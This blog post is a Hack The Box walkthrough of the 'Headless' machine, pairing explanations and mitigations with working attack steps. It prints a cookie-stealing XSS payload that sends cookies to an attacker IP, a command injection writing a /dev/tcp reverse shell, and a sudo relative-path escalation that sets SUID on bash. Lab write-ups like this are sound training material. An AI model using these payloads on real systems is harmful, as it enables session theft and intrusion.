---
layout: post
title: Headless - XSS, Command Injection, and Sudo abuse.
date: 2024-04-15 10:14:00-0400
description: Headless - Hack The Box walkthrough.
tags: easy-box HTB XSS Reflected-XSS Cross-Site-Scripting cookies cookie-manipulation session-hijacking command-injection sudo-misconfiguration relative-paths secure-coding
categories: HTB-Machines
thumbnail: /assets/img/2024/2024-03-headless/headless-img.png
giscus_comments: false
related_posts: true
toc:
  sidebar: left
featured: false
---


# Introduction
Headless is rated as an easy box. It begins with exploiting a Reflected Cross-Site Scripting (XSS) vulnerability to steal a cookie. Requests to a restricted page are manipulated to include the stolen cookie to hijack an admin session, and access the page. From there, an un-sanitised field on a form is abused to obtain remote code execution via a reverse shell. Privilege escalation is achieved by abusing a `sudo` misconfiguration.


## Vulnerabilities explored

### Cross-Site Scripting (XSS)
Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. XSS allows attackers to inject malicious scripts into content that other users will view. When this content is viewed, the malicious script executes, which can lead to data theft, session hijacking, and other types of security breaches.

There are three main types of XSS:

1. **Reflected XSS**: The malicious script comes from the user's current request.
2. **Stored XSS**: The malicious script is stored on the server (e.g., in a database) and then later sent to users.
3. **DOM-based XSS**: The vulnerability is in the client-side code rather than the server-side code.

This machine demonstrated an reflected XSS.
#### Example of Reflected XSS

Imagine a scenario where a website has a search function that reflects user input in its response without proper input sanitisation or encoding. For instance:

```html
<!-- Example of a vulnerable HTML page --> 
<html> 
<body> 
	<form method="GET" action="search"> 
		<input type="text" name="query"> 
		<input type="submit" value="Search"> 
	</form> 
	<p>You searched for: <?php echo $_GET['query']; ?></p> 
</body> 
</html>
```

If a user inputs a search term like `<script>alert('XSS')</script>`, and the server includes this input in the HTML response without sanitising, the script will execute in the user's browser. This script could be something more malicious, like stealing cookies or other sensitive information.
#### Mitigation

- **Input Sanitisation**: Always sanitize all inputs, especially those that can be reflected back in any form to the user. This includes less obvious fields like HTTP headers (*hint: that's the vector for this machine)*.
- **Content Security Policy (CSP)**: Implementing a robust CSP can help prevent XSS by restricting the sources from which scripts can be loaded and executed.
- **Secure Coding Practices**: Employ secure coding practices that involve encoding user inputs so that they are treated as data rather than executable code.


### Cookie manipulation
Cookie manipulation involves altering the contents of a cookie before it is sent to the server. This could involve changing session tokens, user IDs, or other data stored in cookies to escalate privileges or change user settings.
#### Mitigation
- **Use Secure Cookies**: Set cookies with the `Secure` attribute to ensure they are only sent over HTTPS, preventing transmission over unencrypted connections.
- **HttpOnly Attribute**: Use the `HttpOnly` attribute to prevent access to cookie values via JavaScript. This helps protect against XSS attacks that attempt to steal cookies.
- **SameSite Attribute**: Use the `SameSite` attribute to restrict how cookies are sent with cross-site requests. This can help prevent cross-site request forgery (CSRF) attacks.
- **Cookie Integrity**: Implement mechanisms to ensure the integrity of cookie values, such as signing cookies with a secret key. An integrity check can detect if the cookie has been tampered with.
- **Strict Validation**: Validate all input from cookies before use. Do not trust data stored in cookies without validation, especially for access control decisions.


### Session hijacking
Session hijacking, also known as session takeover, involves exploiting a valid computer session—most often by stealing or predicting a valid session token—to gain unauthorized access to information or services in a computer system.
#### Mitigation
- **Session Expiration**: Implement session expiration and timeout mechanisms that automatically log users out after a period of inactivity or after a maximum session duration.
- **Regenerate Session IDs**: Regenerate session IDs after a successful login to prevent session fixation attacks, where an attacker fixes the session ID before the user logs in.
- **Monitor and Validate Sessions**: Monitor session activity for anomalies and validate sessions based on multiple attributes (e.g., IP address, User-Agent) to detect and prevent hijacking.


### Command injection
Command injection vulnerabilities can occur in any place where an application passes user input to a system shell command. If the user input is not properly sanitized, attackers can append additional commands or alter the intended command, leading to potentially severe consequences such as unauthorized access, data leakage, or server compromise.
#### Mitigation
- **Proper Input Validation**: Ensure that all user inputs are validated against a strict set of rules. Only allow known good inputs to pass through and be used in commands.
- **Avoid Using Shell Commands**: Where possible, avoid using shell commands altogether. Use built-in library functions provided by your programming language or framework that perform the desired operations without invoking the shell.
- **Use Safe APIs**: If you must execute system commands, use safe APIs that avoid shell execution, such as parameterized functions or APIs that do not involve the shell.
- **Escaping Special Characters**: If system commands must include user input, ensure that special characters are properly escaped so that they are treated as literal values rather than executable code. However, escaping should be a last resort after safer alternatives have been considered.
- **Use Least Privilege Principles**: Run applications with the minimum permissions necessary. Restricting the privileges of the application environment can limit the damage an attacker can do if they manage to inject commands.


### Sudo misconfiguration
The `sudoers` file controls which users can execute commands with elevated privileges. If this file is configured to allow a user to run certain commands as the superuser without requiring a password, it may lead to security risks if the commands are inherently dangerous or can be exploited. 

Some binaries, when executed with elevated privileges, can be used to perform tasks that compromise the security of the system. For instance, if a binary allows file manipulation, code execution, or access to the shell, an attacker can use it to gain higher privileges or execute arbitrary commands.
#### Mitigation Strategies
- **Review and Restrict Sudo Policies**: Regularly audit the `sudoers` file to ensure that only necessary permissions are granted. Commands that can be exploited for privilege escalation should not be runnable with elevated privileges without strong justifications and controls.
- **Password Protections**: Require passwords for sudo access to add an extra layer of security, ensuring that only authenticated users can execute commands with elevated privileges.
- **Security Training and Awareness**: Educate administrators and users about the risks associated with improper sudo configurations and encourage security best practices.
- **Use Secure Programming Practices**: When developing applications that will be used in environments with sudo access, ensure they are securely coded to prevent exploitation.
- **Regular Security Audits**: Regularly perform security audits and vulnerability assessments to identify and mitigate risks associated with privilege escalation.


### Insecure coding practices
Insecure coding practices can lead to significant vulnerabilities, allowing attackers to exploit the application. Here are common insecure coding practices observed:

- **Improper Input Sanitisation**: Failing to sanitise user inputs properly can lead to various forms of injection attacks, including SQL, command, and script injections. In the context of the "Headless" box, the lack of sanitisation in the date selection field allowed for command injection, demonstrating how critical rigorous input validation is to security.
- **Using Relative Paths for File Execution**: Utilising relative paths for file execution, as seen with the `initdb.sh` script in the `syscheck` binary, poses a security risk. It can lead to unauthorised file execution if an attacker can place a malicious file in the expected path, leading to privilege escalation.

#### Mitigation
- **Implement Thorough Input Validation**: Ensure all user inputs are validated against a strict set of rules. Reject any input that does not strictly conform to expected patterns, especially in command execution or database queries.
- **Use Absolute Paths**: Always use absolute paths when referencing executables or other files within code. This practice prevents directory traversal attacks and ensures that the application only accesses files explicitly defined in the code.
- **Adopt Secure Coding Standards**: Follow secure coding guidelines and standards such as OWASP Top 10 to understand and mitigate common vulnerabilities. Regular code reviews and security audits can also help catch and fix insecure practices early in the development lifecycle.


## Tools
- Nmap
- Burpsuite


## Tactics and Methods

#### Exploiting a Reflected XSS vulnerability to steal cookies
- The webform fields were sanitised, but the HTTP headers were not. Exploiting the lack of sanitisation on the `User-Agent` (or `Accept`) field in the headers allows for a cookie to be stolen.

#### Authentication bypass via cookie manipulation and session hijacking
- By manipulating the HTTP headers to include a stolen cookie, a admin session was hijacked and unauthorised access to a dashboard  obtained.

#### Remote code execution via command injection
- By exploiting an field on the dashboard that was not sanitised, a reverse shell was created and executed server-side.

#### Abusing `Sudo` to achieve privilege escalation
- A relative path within a binary the standard user could run as `sudo` with no password was exploited to call a malicious script to execute a reverse shell as root.


---
# Enumeration
As always, begin with Nmap scanning
## Nmap scanning

```bash
┌──(emdeh㉿kali)-[~/Documents/htb-machines/headless/scans]
└─$ nmap -A 10.129.27.108 | tee nmap-output.txt
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-12 23:51 EDT
Nmap scan report for 10.129.27.108
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 13 Apr 2024 03:52:24 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```
### Findings

1. Port 22
2. Port 5000 with some additional details

```bash
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 13 Apr 2024 03:52:24 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
```

The server header indicates the use of Werkzeug/2.2.2 Python/3.11.2, suggesting a Python-based web application, possibly Flask. The presence of a cookie with the name `is_admin` is particularly interesting. It suggests that the application might be vulnerable to cookie tampering or session management vulnerabilities.

Possible vectors include:
- **Cookie Manipulation:** You can explore manipulating this cookie. Try decoding it if it’s base64-encoded, or if it looks like a serialized Python object, consider object deserialization attacks.
- **Directory Traversal/File Inclusion:** Given it's a web server, you might also look into directory traversal or file inclusion vulnerabilities.


## Server enumeration

Dirsearch is used to find other pages to enumerate on.

```bash
┌──(emdeh㉿kali)-[~/Documents/htb-machines/headless/scans]
└─$ dirsearch -u http://10.129.27.108:5000
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Documents/htb-machines/headless/scans/reports/http_10.129.27.108_5000/_24-04-13_00-10-00.txt

Target: http://10.129.27.108:5000/

[00:10:00] Starting:
[00:12:25] 401 -  317B  - /dashboard
[00:14:28] 200 -    2KB - /support

Task Completed
```

Two pages are identified:
1. `http://10.129.27.108:5000/dashboard` results in Unauthorized.
2. `http://10.129.27.108:5000/support` returns a webform.

<img src="/assets/img/2024/2024-03-headless/webform.png" alt="webform.png" class="auto-resize">


## Webform enumeration 

Using Burpsuite, the responses to the submissions can be monitored.

A benign submissions results in a unremarkable POST request with a 200 status code.

Sending an url-encoded reverse shell returns a **Hacking Attempt Detected*** warning, with the previously identified cookie displayed.

<img src="/assets/img/2024/2024-03-headless/url-encoded-shell.png" alt="url-encoded-shell.png" class="auto-resize">

<img src="/assets/img/2024/2024-03-headless/hacking-attempt-detected.png" alt="hacking-attempt-detected.png" class="auto-resize">

The cookie's first part decodes from Base-64 to `user`. The second part is not clearly discernible. If it were a JWT the second part would be the payload, so perhaps this represents unique users.

The inclusion of the cookie in various locations suggests that perhaps other cookies can be stolen.


# Stealing cookies via a Reflected XSS


## User-Agent as an injection point
The server is displaying an error page when a hacking attempt is detected, and this page includes the `User-Agent` string, along with other client request information. If this information is not sanitised before being included in the HTML of the error page, it could lead to an XSS vulnerability.
## The payload
The following payload uses an error-handling method to execute JavaScript.

`<img src=x onerror=fetch('http://IP/?c='+document.cookie);>`

- **`<img src=x>`**: This part attempts to load an image from a source that doesn’t exist (`x`), which will naturally cause an error.
- **`onerror=fetch(...)`**: The `onerror` attribute of the `<img>` tag fires when an error occurs (like failing to load the image). It triggers the fetch API call.
- **`fetch('http://IP/?c='+document.cookie)`**: This JavaScript fetches a URL, appending the document's cookies as a query parameter. 

 The `fetch` part is a classic technique for stealing cookies if the fetched domain is controlled by the attacker which, in this case, it is.

## Executing the attack
To execute the attack, Burpsuite can be used to repeat the POST method used to submit a form.

The payload is then placed in the `User-Agent` field. However, any of the fields that are rendered in the HTML of the error page could potentially work. For example, replacing the `Accept` value with the payload also worked in this instance. 

The `message` field of the form needs to include something that will trigger the error. This could be the reverse shell attempted earlier or a copy of the payload in the `User-Agent` field - it doesn't matter, as long as it triggers the error.

> *Including the cookie stealing payload in the `message` field is only to trigger the error; it does not actually execute from here because this field is not displayed back on the error page.*

```
POST /support HTTP/1.1
Host: 10.129.27.108:5000
Content-Length: 140
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.27.108:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: <img src=x onerror=fetch('http://10.10.14.6/?c='+document.cookie);>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.27.108:5000/support
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Connection: close

fname=emdeh&lname=emdeh&email=emdeh%40emdeh.com&phone=emdeh&message=abc; <img src=x onerror=fetch('http://10.10.14.6/?c='+document.cookie);>
```

Once the payload is ready, a webserver is started to receive the `document.cookie` value as a query parameter to the malicious GET request the server is inadvertently tricked into sending.

```bash
┌──(emdeh㉿kali)-[~/Documents]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.27.108 - - [13/Apr/2024 01:12:14] "GET /?c=is_admin=ImFkbWluIg.<SNIP> HTTP/1.1" 200 -

```


# Cookie manipulation

Putting the captured cookie through a decoder reveals it has a header value of `admin`. Given the original cookie had a value of `user`, it would appear an administrator cookie has been obtained.

Including the cookie in a request to the `/dashboard` page successfully hijacks a admin session and reveals the Administrator Dashboard with a simple form to generate a website health report with a `Select Date` field.

<img src="/assets/img/2024/2024-03-headless/admin-dashboard.png" alt="admin-dashboard.png" class="auto-resize">


# Enumerating the `Select Date` field

Testing to see if the `Select Date` field is properly sanitised quickly suggests it is not. Including `;ls` returns a list of files to the browser as shown below.

<img src="/assets/img/2024/2024-03-headless/admin-dashboard-ls.png" alt="admin-dashboard-ls.png" class="auto-resize">

<img src="/assets/img/2024/2024-03-headless/admin-dashboard-ls-show.png" alt="admin-dashboard-ls-show.png" class="auto-resize">


# Command injection
Attempting to exploit this to execute a reverse shell fails. Another option is to attempt to create a reverse shell in a file, and then subsequently call the file.

Try to create a reverse shell on the server, the following command is injected into the field:

`echo '#!/bin/bash' > reverse_shell.sh && echo 'sh -i >& /dev/tcp/10.10.14.6/4321 0>&1' >> reverse_shell.sh`

The command is URL-encoded and submitted, making sure to include the stolen cookie in the HTTP headers.

<img src="/assets/img/2024/2024-03-headless/data-payload.png" alt="data-payload.png" class="auto-resize">

To validate that the file has been created successfully, another `ls` command can be sent.

<img src="/assets/img/2024/2024-03-headless/rev-shell-confirm.png" alt="rev-shell-confirm.png" class="auto-resize">

After confirming the file was successfully  created, it can be called and the resulting shell caught on a netcat listener as shown below.

<img src="/assets/img/2024/2024-03-headless/rev-shell-execute.png" alt="rev-shell-execute.png" class="auto-resize">

And the first flag found.

<img src="/assets/img/2024/2024-03-headless/first-flag.png" alt="first-flag.png" class="auto-resize">


# System enumeration

As always, checking for any `sudo` rights is a good place to start.

```bash
$ whoami
dvir
$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck

```

In this case, the user can execute `/usr/bin/syscheck` as sudo with no password.

Checking what the binary is reveals a bash script that needs elevated privileges to check some values and retrieve system information.

```bash
$ strings /usr/bin/syscheck
#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  exit 1
last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"
load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
exit 0
$
```

The `if` statement is particularly interesting. It checks if a script named `initdb.sh` is currently running. If it's not running, it attempts to start this script and prints a message indicating it's starting the database service. If it is running, it prints that the database service is running.

The file can be created in the present working directory to impersonate the `initdb.sh` script. If `/usr/bin/syscheck` is executed from the same directory to where the fake `initdb.sh` script is created, it will execute this file because it uses a relative path to locate and run `initdb.sh`. 


## Relative path vs. Absolute path

In the original script, the problematic part is:
```bash
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."

```

Here, `./initdb.sh` refers to a relative path, which means it looks for `initdb.sh` in the current working directory.

Here is a version of the script using absolute paths.

```bash 
#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"
load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

# Absolute path used here
initdb_script="/opt/scripts/initdb.sh"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  if [ -x "$initdb_script" ]; then
    $initdb_script 2>/dev/null
    /usr/bin/echo "Database service started."
  else
    /usr/bin/echo "Error: initdb.sh script not found or not executable."
  fi
else
  /usr/bin/echo "Database service is running."
fi
```


1. **Absolute Path Definition**: The path to `initdb.sh` is set as an absolute path (`/opt/scripts/initdb.sh`). This ensures that the script always attempts to execute the specific `initdb.sh` located in `/opt/scripts`, regardless of the current working directory.
2. **Check for Script Existence and Executability**: Before attempting to execute `initdb.sh`, the script checks if the file exists and is executable (`-x`). This adds an additional layer of safety by ensuring that the script does not attempt to execute a non-existent or non-executable file, which could result in errors or security issues.
3. **Clear Error Messaging**: In case the `initdb.sh` script is not found or is not executable, the script clearly prints an error message. This helps in troubleshooting and ensures that script failures due to path issues are communicated clearly to the user or administrator.

Using absolute paths like this not only mitigates the risk of unintended file execution but also enhances the script's robustness by making its operation more predictable and secure.


# Privilege escalation

Creating the `initdb.sh` file to execute `/bin/bash` results in the shell elevated to root privileges. 

```bash
$ echo "chmod u+s /bin/bash" > initdb.sh
$ chmod +x initdb.sh
$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.06, 0.03, 0.00
Database service is not running. Starting it...
$ /bin/bash -p
whoami
root
cat /root/root.txt
f894b8ca49729b<SNIP>
```

**`echo "chmod u+s /bin/bash" > initdb.sh`**
- This writes a command into a script file (`initdb.sh`) that, when executed, will set the SUID bit on `/bin/bash`. Setting the SUID bit (`u+s`) on `/bin/bash` will allow any user to run Bash as the root user. As the `/usr/bin/syscheck` binary can be ran in the context of `sudo`, calling `initdb.sh` via this binary , means the encapsulated command will also be ran as `sudo`, and `/bin/bash` will have its SUID successfully modified.

**`chmod +x initdb.sh`**
- Makes the `initdb.sh` script executable.

**`sudo /usr/bin/syscheck`**
- Runs the binary the user has sudo rights over, which ends with the malicious `initdb.sh` script being called.

**`/bin/bash -p`**
- Launches a new Bash shell with the SUID bit set (`-p`), running with root privileges because of the earlier `chmod u+s /bin/bash`.

